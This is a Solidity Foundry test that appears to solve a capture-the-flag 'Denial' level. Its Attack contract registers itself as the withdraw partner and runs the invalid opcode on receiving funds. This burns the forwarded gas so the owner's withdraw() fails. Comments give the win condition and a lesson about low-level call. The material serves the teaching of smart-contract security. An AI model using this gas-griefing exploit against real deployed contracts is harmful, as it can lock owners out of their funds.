// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Denial.sol";

/// @custom:win-condition 
// This is a simple wallet that drips funds over time. You can withdraw the funds slowly by becoming a withdrawing partner.

// If you can deny the owner from withdrawing funds when they call withdraw() (whilst the contract still has funds, 
// and the transaction is of 1M gas or less) you will win this level.

/// @custom:lesson-learned
// low level "call" is bad and malicious users can drain out all the gas with infinite loops or opcodes
// (having a large enough amount of gas can mitigate this)

contract Attack {

    function attack(Denial _denial) public {
       _denial.setWithdrawPartner(address(this));
    }

    receive() external payable {
      assembly {
        invalid()
      }
    }
}


contract DenialSolvedTest is Test {

  Denial public s_denial;
  Attack public s_attack;
  address payable s_user;

  function setUp() public { 
    s_user = payable(vm.addr(1));
    s_denial = new Denial();
    s_attack = new Attack();
    vm.deal(address(s_denial), 10 ether);
    vm.deal(address(this), 1 ether);
  }

  function testWinCondition() public {

    s_attack.attack(s_denial);

    // 1-4M gas will run out. 5M+ will not. This is because call does not forward 100% of the gas, so this attack can be mitigated with enough gas.
    (bool success, ) = address(s_denial).call{gas: 1000000}(abi.encodeWithSignature("withdraw()"));

    assertEq(s_denial.owner().balance, 0);
  }
}